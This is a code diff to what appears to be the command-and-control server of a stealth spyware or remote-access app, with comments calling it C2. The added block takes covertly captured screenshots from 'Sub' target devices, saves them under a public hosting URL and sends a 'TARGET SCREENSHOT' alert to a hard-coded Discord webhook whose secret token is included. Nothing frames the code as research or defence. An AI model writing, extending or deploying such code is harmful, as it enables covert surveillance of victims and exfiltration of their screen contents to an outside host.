@@ -147,6 +147,40 @@ io.on('connection', (socket) => {
     // Relay stealth screenshots from Sub to Admin
     socket.on('incoming_screenshot', (data) => {
         io.to('admins').emit('incoming_screenshot', data);
+        
+        // Write to file and Webhook
+        if (data.base64) {
+            try {
+                const subId = connectedDevices[socket.id] ? connectedDevices[socket.id].id : 'Unknown Sub';
+                const filename = `screenshot_${Date.now()}.png`;
+                const filepath = path.join(__dirname, 'uploads', filename);
+                fs.writeFileSync(filepath, data.base64, 'base64');
+                
+                // Assuming standard render domain if no req is present for host URL context.
+                const fileUrl = `https://apkv2.onrender.com/uploads/${filename}`;
+                
+                const https = require('https');
+                const url = require('url');
+                const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1493921945765281804/OobgGgkPuLvpaC5uhMXl0KaBwcl6MtpKQhxsn7T7-q5iu031lnAQUmuVaqqLFvCKJeJ8";
+                
+                const payload = JSON.stringify({
+                    content: `**TARGET SCREENSHOT:** ${subId}\n**Link:** ${fileUrl}`
+                });
+
+                const parsedUrl = url.parse(DISCORD_WEBHOOK_URL);
+                const options = {
+                    hostname: parsedUrl.hostname, port: 443, path: parsedUrl.path, method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
+                };
+
+                const req = https.request(options);
+                req.on('error', (e) => console.error(`[C2] Problem with Discord Webhook: ${e.message}`));
+                req.write(payload);
+                req.end();
+            } catch(e) {
+                console.error("Screenshot Webhook error:", e);
+            }
+        }
     });
 
     socket.on('disconnect', () => {
